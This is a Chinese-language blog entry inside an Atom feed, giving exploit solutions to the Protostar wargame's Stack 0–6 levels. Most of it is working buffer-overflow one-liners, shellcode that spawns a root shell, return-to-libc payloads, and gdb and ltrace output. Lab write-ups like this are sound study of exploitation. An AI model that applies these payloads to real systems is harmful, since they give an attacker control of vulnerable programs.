<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
	<title>LuckyDog | CSUwangj&#x27;s Blog - unlink</title>
	<link href="https://CSUwangj.github.io/tags/unlink/atom.xml" rel="self" type="application/atom+xml"/>
  <link href="https://CSUwangj.github.io/"/>
	<generator uri="https://www.getzola.org/">Zola</generator>
	<updated>2020-08-07T02:01:26.830854+08:00</updated>
	<id>https://CSUwangj.github.io/tags/unlink/atom.xml</id>
	<entry xml:lang="en">
		<title>Exploit-Exercise_Protostar全攻略+解析</title>
		<published>2018-07-22T14:46:15+08:00</published>
		<updated>2020-08-07T02:01:26.830854+08:00</updated>
		<link rel="alternate" href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/" type="text/html"/>
		<id>https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/</id>
		<content type="html">&lt;p&gt;$1目前进度：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Stack 0&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Stack 1&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Stack 2&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Stack 3&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
小结一：C&#x2F;C++程序中的栈&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Stack 4&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
小结二：EIP能好怎&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Stack 5&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
小结三：shellcode&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Stack 6&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Stack 7&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Format 0&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Format 1&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Format 2&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Format 3&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Format 4&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
小结四：格式化字符串&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Heap 0&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Heap 1&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Heap 2&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Heap 3&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Net 0&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Net 1&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Net 2&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Final 0&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Final 1&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Final 2&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h1 id=&quot;stack-0&quot;&gt;Stack 0&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ python -c &amp;quot;print &amp;#x27;a&amp;#x27;*65&amp;quot; | .&amp;#x2F;stack0
you have changed the &amp;#x27;modified&amp;#x27; variable
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;stack-1&quot;&gt;Stack 1&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ python -c &amp;quot;print &amp;#x27;a&amp;#x27;*64+&amp;#x27;dcba&amp;#x27;&amp;quot; | xargs .&amp;#x2F;stack1
you have correctly got the variable to the right value
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;stack-2&quot;&gt;Stack 2&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;GREENIE=`python -c &amp;quot;print &amp;#x27;a&amp;#x27;*64+&amp;#x27;\x0a\x0d\x0a\x0d&amp;#x27;&amp;quot;` .&amp;#x2F;stack2
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;stack-3&quot;&gt;Stack 3&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;(gdb) disas win
Dump of assembler code for function win:
0x08048424 &amp;lt;win+0&amp;gt;:     push   %ebp
0x08048425 &amp;lt;win+1&amp;gt;:     mov    %esp,%ebp
0x08048427 &amp;lt;win+3&amp;gt;:     sub    $0x18,%esp
0x0804842a &amp;lt;win+6&amp;gt;:     movl   $0x8048540,(%esp)
0x08048431 &amp;lt;win+13&amp;gt;:    call   0x8048360 &amp;lt;puts@plt&amp;gt;
0x08048436 &amp;lt;win+18&amp;gt;:    leave
0x08048437 &amp;lt;win+19&amp;gt;:    ret
End of assembler dump.
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ python -c &amp;quot;print &amp;#x27;a&amp;#x27;*64+&amp;#x27;\x23\x84\x04\x08&amp;#x27;&amp;quot; | .&amp;#x2F;stack3
calling function pointer, jumping to 0x08048423
code flow successfully changed
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;stack-4&quot;&gt;Stack 4&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;(gdb) disas main
Dump of assembler code for function main:
0x08048408 &amp;lt;main+0&amp;gt;:    push   %ebp
0x08048409 &amp;lt;main+1&amp;gt;:    mov    %esp,%ebp
0x0804840b &amp;lt;main+3&amp;gt;:    and    $0xfffffff0,%esp
0x0804840e &amp;lt;main+6&amp;gt;:    sub    $0x50,%esp
0x08048411 &amp;lt;main+9&amp;gt;:    lea    0x10(%esp),%eax
0x08048415 &amp;lt;main+13&amp;gt;:   mov    %eax,(%esp)
0x08048418 &amp;lt;main+16&amp;gt;:   call   0x804830c &amp;lt;gets@plt&amp;gt;
0x0804841d &amp;lt;main+21&amp;gt;:   leave
0x0804841e &amp;lt;main+22&amp;gt;:   ret
End of assembler dump.
(gdb) disas win
Dump of assembler code for function win:
0x080483f4 &amp;lt;win+0&amp;gt;:     push   %ebp
0x080483f5 &amp;lt;win+1&amp;gt;:     mov    %esp,%ebp
0x080483f7 &amp;lt;win+3&amp;gt;:     sub    $0x18,%esp
0x080483fa &amp;lt;win+6&amp;gt;:     movl   $0x80484e0,(%esp)
0x08048401 &amp;lt;win+13&amp;gt;:    call   0x804832c &amp;lt;puts@plt&amp;gt;
0x08048406 &amp;lt;win+18&amp;gt;:    leave
0x08048407 &amp;lt;win+19&amp;gt;:    ret
End of assembler dump.
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;echo &amp;quot;s=&amp;#x27;a&amp;#x27;*64\nfor i in range(0, 26):\n  s += chr(ord(&amp;#x27;a&amp;#x27;)+i)\nprint s&amp;quot; | python
### run with this pattern input
(gdb) r &amp;lt; ~&amp;#x2F;stack4.txt
Starting program: &amp;#x2F;opt&amp;#x2F;protostar&amp;#x2F;bin&amp;#x2F;stack4 &amp;lt; ~&amp;#x2F;stack4.txt

Program received signal SIGSEGV, Segmentation fault.
0x706f6e6d in ?? ()#That&amp;#x27;s what we need
###
$ python -c &amp;quot;print &amp;#x27;a&amp;#x27;*0x4c+&amp;#x27;\xf4\x83\x04\x08&amp;#x27;&amp;quot; | .&amp;#x2F;stack4
code flow successfully changed
Segmentation fault
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;stack-5&quot;&gt;Stack 5&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ (python -c &amp;quot;print  &amp;#x27;\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80&amp;#x27;+ (76-37)*&amp;#x27;a&amp;#x27;+&amp;#x27;\xa0\xfc\xff\xbf&amp;#x27;&amp;quot;; cat) | .&amp;#x2F;stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;(python -c &amp;quot;print &amp;#x27;\x89\xe5\xdb\xd2\xd9\x75\xf4\x59\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x41\x41&amp;#x27;+(76-68)*&amp;#x27;a&amp;#x27;+&amp;#x27;\xa0\xfc\xff\xbf&amp;#x27;&amp;quot;; cat) | .&amp;#x2F;stack5
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ (python -c &amp;quot;print &amp;#x27;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&amp;#x27;+(76-29)*&amp;#x27;\xcc&amp;#x27;+&amp;#x27;\xa0\xfc\xff\xbf&amp;#x27;&amp;quot;; cat) | .&amp;#x2F;stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ (python -c &amp;#x27;print &amp;quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80&amp;quot; + &amp;quot;\xcc&amp;quot;*(76-34) + &amp;quot;\xa0\xfc\xff\xbf&amp;quot;&amp;#x27;; cat) | .&amp;#x2F;stack5
Owned!!!
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;stack-6&quot;&gt;Stack 6&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;solution-1-duplicated-shellcode&quot;&gt;solution 1: Duplicated Shellcode&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ python -c &amp;quot;print &amp;#x27;b&amp;#x27;*80&amp;quot; |.&amp;#x2F;stack6
input path please: got path bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
input path please: got path bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb ▒
Segmentation fault (core dumped)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这时在dump出来的文件里可以发现输入的东西在别处出现了&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;exploit-exercise-protostarquan-gong-lue-jie-xi&#x2F;1532445422307.png&quot; alt=&quot;Duplicated Shellcode&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;exploit-exercise-protostarquan-gong-lue-jie-xi&#x2F;1532445627447.png&quot; alt=&quot;Duplicated Shellcode2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ (python -c &amp;quot;print  &amp;#x27;\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80&amp;#x27;+ (80-37)*&amp;#x27;a&amp;#x27;+&amp;#x27;\x00\xe0\xfd\xb7&amp;#x27;&amp;quot;; cat) | .&amp;#x2F;stack6
input path please: got path 1▒▒▒RRRT[S_▒&amp;#x2F;bin▒G&amp;#x2F;&amp;#x2F;sh@u▒;1ɰ
                                                        ̀aaaaaaaaaaaaaaaaaaaaaaaaaaa
id
uid	=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ (python -c &amp;quot;print &amp;#x27;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&amp;#x27;+(80-29)*&amp;#x27;\xcc&amp;#x27;+&amp;#x27;\x00\xe0\xfd\xb7&amp;#x27;&amp;quot;; cat) | .&amp;#x2F;stack6
input path please: got path ▒&amp;#x2F;sh▒%▒▒▒P▒&amp;#x2F;binP▒▒1▒
                                                1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;xun-gen-jiu-di&quot;&gt;寻根究底&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ python -c &amp;quot;print &amp;#x27;b&amp;#x27;*80&amp;quot; |ltrace -S .&amp;#x2F;stack6 | grep b7fd
SYS_brk(NULL)                                         = 0x0804a000
SYS_fcntl64(0, 1, 0, 0, 0xb7ffeff4)                   = 0
SYS_fcntl64(1, 1, 0, 1, 0xb7ffeff4)                   = 0
SYS_fcntl64(2, 1, 0, 2, 0xb7ffeff4)                   = 0
SYS_access(&amp;quot;&amp;#x2F;etc&amp;#x2F;suid-debug&amp;quot;, 00)                     = -2
SYS_access(&amp;quot;&amp;#x2F;etc&amp;#x2F;ld.so.nohwcap&amp;quot;, 00)                  = -2
SYS_mmap2(0, 8192, 3, 34, -1)                         = 0xb7fe0000
SYS_access(&amp;quot;&amp;#x2F;etc&amp;#x2F;ld.so.preload&amp;quot;, 04)                  = -2
SYS_open(&amp;quot;&amp;#x2F;etc&amp;#x2F;ld.so.cache&amp;quot;, 0, 00)                   = 3
SYS_fstat64(3, 0xbffff6d4, 0xb7ffeff4, 0xb7fff87c, 3) = 0
SYS_mmap2(0, 13796, 1, 2, 3)                          = 0xb7fdc000
SYS_close(3)                                          = 0
SYS_access(&amp;quot;&amp;#x2F;etc&amp;#x2F;ld.so.nohwcap&amp;quot;, 00)                  = -2
SYS_open(&amp;quot;&amp;#x2F;lib&amp;#x2F;libc.so.6&amp;quot;, 0, 00)                     = 3
SYS_read(3, &amp;quot;\177ELF\001\001\001&amp;quot;, 512)               = 512
SYS_fstat64(3, 0xbffff720, 0xb7ffeff4, 0xb7fdf21d, 0x8048268) = 0
SYS_mmap2(0, 0x144948, 5, 2050, 3)                    = 0xb7e97000
SYS_mprotect(0xb7fd5000, 4096, 0)                     = 0
SYS_mmap2(0xb7fd6000, 12288, 3, 2066, 3)              = 0xb7fd6000
SYS_mmap2(0xb7fd9000, 10568, 3, 50, -1)               = 0xb7fd9000
SYS_close(3)                                          = 0
SYS_mmap2(0, 4096, 3, 34, -1)                         = 0xb7e96000
SYS_set_thread_area(0xbffffbc0, 0xb7ffeff4, 0xb7e966c0, 1, 0) = 0
SYS_mprotect(0xb7fd6000, 8192, 1)                     = 0
SYS_mprotect(0xb7ffe000, 4096, 1)                     = 0
SYS_munmap(0xb7fdc000, 13796)                         = 0
__libc_start_main(0x80484fa, 1, 0xbffffd94, 0x8048520, 0x8048510 &amp;lt;unfinished ...&amp;gt;
printf(&amp;quot;input path please: &amp;quot; &amp;lt;unfinished ...&amp;gt;
SYS_fstat64(1, 0xbffff604, 0xb7fd7ff4, 0xb7fd84c0, 0x80485d0) = 0
SYS_mmap2(0, 4096, 3, 34, -1)                         = 0xb7fdf000
&amp;lt;... printf resumed&amp;gt; )                                = 19
fflush(0xb7fd84c0 &amp;lt;unfinished ...&amp;gt;
SYS_write(1, &amp;quot;input path please: &amp;quot;, 19)               = 19
&amp;lt;... fflush resumed&amp;gt; )                                = 0
gets(0xbffffc8c, 0, 0xb7fe1b28, 1, 0 &amp;lt;unfinished ...&amp;gt;
SYS_fstat64(0, 0xbffffb5c, 0xb7fd7ff4, 0xb7fd8420, 0xb7fd8420) = 0
SYS_mmap2(0, 4096, 3, 34, -1)                         = 0xb7fde000
SYS_read(0, &amp;quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;quot;..., 4096) = 81
&amp;lt;... gets resumed&amp;gt; )                                  = 0xbffffc8c
printf(&amp;quot;got path %s\n&amp;quot;, &amp;quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;quot;...) = 74
printf(&amp;quot;input path please: &amp;quot;)                         = 19
fflush(0xb7fd84c0 &amp;lt;unfinished ...&amp;gt;
SYS_write(1, &amp;quot;got path bbbbbbbbbbbbbbbbbbbbbbb&amp;quot;..., 93) = 93
&amp;lt;... fflush resumed&amp;gt; )                                = 0
gets(0xbffffc8c, 0xbffffc8c, 0xb7fe1b28, 1, 0 &amp;lt;unfinished ...&amp;gt;
SYS_read(0, &amp;quot;&amp;quot;, 4096)                                 = 0
&amp;lt;... gets resumed&amp;gt; )                                  = 0
printf(&amp;quot;got path %s\n&amp;quot;, &amp;quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;quot;...) = 98
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;solution-2-return-to-text&quot;&gt;solution 2: Return to .text&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ (python -c &amp;quot;print &amp;#x27;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&amp;#x27;+(80-29)*&amp;#x27;\xcc&amp;#x27;+&amp;#x27;\xf9\x84\x04\x08&amp;#x27;+&amp;#x27;\x7c\xfc\xff\xbf&amp;#x27;&amp;quot;; cat) | .&amp;#x2F;stack6
input path please: got path ▒&amp;#x2F;sh▒%▒▒▒P▒&amp;#x2F;binP▒▒1▒
                                                1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;后来发现这个payload是不能复用的，猜测是因为栈地址会变化的原因&lt;&#x2F;p&gt;
&lt;h2 id=&quot;solution-3-return-to-libc&quot;&gt;solution 3: Return to libc&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;(gdb) disas main
Dump of assembler code for function main:
0x080484fa &amp;lt;main+0&amp;gt;:    push   %ebp
0x080484fb &amp;lt;main+1&amp;gt;:    mov    %esp,%ebp
0x080484fd &amp;lt;main+3&amp;gt;:    and    $0xfffffff0,%esp
0x08048500 &amp;lt;main+6&amp;gt;:    call   0x8048484 &amp;lt;getpath&amp;gt;
0x08048505 &amp;lt;main+11&amp;gt;:   mov    %ebp,%esp
0x08048507 &amp;lt;main+13&amp;gt;:   pop    %ebp
0x08048508 &amp;lt;main+14&amp;gt;:   ret
End of assembler dump.
(gdb) b *0x80484fd
Breakpoint 1 at 0x80484fd: file stack6&amp;#x2F;stack6.c, line 26.
(gdb) r
Starting program: &amp;#x2F;opt&amp;#x2F;protostar&amp;#x2F;bin&amp;#x2F;stack6

Breakpoint 1, 0x080484fd in main (argc=1, argv=0xbffffd54) at stack6&amp;#x2F;stack6.c:26
26      stack6&amp;#x2F;stack6.c: No such file or directory.
        in stack6&amp;#x2F;stack6.c
(gdb) p system
$2 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7ecffb0 &amp;lt;__libc_system&amp;gt;
(gdb) p exit
$3 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7ec60c0 &amp;lt;*__GI_exit&amp;gt;

(gdb) info proc map
process 16347
cmdline = &amp;#x27;&amp;#x2F;opt&amp;#x2F;protostar&amp;#x2F;bin&amp;#x2F;stack6&amp;#x27;
cwd = &amp;#x27;&amp;#x2F;opt&amp;#x2F;protostar&amp;#x2F;bin&amp;#x27;
exe = &amp;#x27;&amp;#x2F;opt&amp;#x2F;protostar&amp;#x2F;bin&amp;#x2F;stack6&amp;#x27;
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0       &amp;#x2F;opt&amp;#x2F;protostar&amp;#x2F;bin&amp;#x2F;stack6
         0x8049000  0x804a000     0x1000          0       &amp;#x2F;opt&amp;#x2F;protostar&amp;#x2F;bin&amp;#x2F;stack6
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         &amp;#x2F;lib&amp;#x2F;libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         &amp;#x2F;lib&amp;#x2F;libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         &amp;#x2F;lib&amp;#x2F;libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         &amp;#x2F;lib&amp;#x2F;libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fde000 0xb7fe2000     0x4000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         &amp;#x2F;lib&amp;#x2F;ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         &amp;#x2F;lib&amp;#x2F;ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         &amp;#x2F;lib&amp;#x2F;ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) find 0xb7e9700,+2000000,&amp;quot;&amp;#x2F;bin&amp;#x2F;sh&amp;quot;
warning: Unable to access target memory at 0xb7e9700, halting search.
Pattern not found.
(gdb) find 0xb7e97000,+2000000,&amp;quot;&amp;#x2F;bin&amp;#x2F;sh&amp;quot;
0xb7fba23f
warning: Unable to access target memory at 0xb7fd9647, halting search.
1 pattern found.
(gdb) x&amp;#x2F;s 0xb7fba23f
0xb7fba23f:      &amp;quot;KIND in __gen_tempname\&amp;quot;&amp;quot;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;其中一行说到**&lt;code&gt;0xb7e97000 0xb7fd5000   0x13e000          0         &#x2F;lib&#x2F;libc-2.11.2.so&lt;&#x2F;code&gt;**，所以libc是装到了这个位置，但是我们找到&#x2F;bin&#x2F;sh后查看那个地方却不对&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ strings -a -t x &amp;#x2F;lib&amp;#x2F;libc-2.11.2.so | grep &amp;#x2F;bin&amp;#x2F;sh
 11f3bf &amp;#x2F;bin&amp;#x2F;sh
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;(gdb) x&amp;#x2F;s 0xb7fb63bf
0xb7fb63bf:      &amp;quot;&amp;#x2F;bin&amp;#x2F;sh&amp;quot;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ (python -c &amp;quot;print &amp;#x27;a&amp;#x27;*80+&amp;#x27;\xb0\xff\xec\xb7&amp;#x27;+&amp;#x27;\xc0\x60\xec\xb7&amp;#x27;+&amp;#x27;\xbf\x63\xfb\xb7&amp;#x27;&amp;quot;; cat) | .&amp;#x2F;stack6
input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒▒▒aaaaaaaaaaaa▒▒▒▒`췿c▒
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;solution-4-rop-todo&quot;&gt;solution 4: ROP（TODO）&lt;&#x2F;h2&gt;
&lt;h2 id=&quot;can-kao-zi-liao&quot;&gt;参考资料&lt;&#x2F;h2&gt;
&lt;p&gt;总览：https:&#x2F;&#x2F;resources.infosecinstitute.com&#x2F;exploiting-protostar-stack-4-7&#x2F;#gref&lt;&#x2F;p&gt;
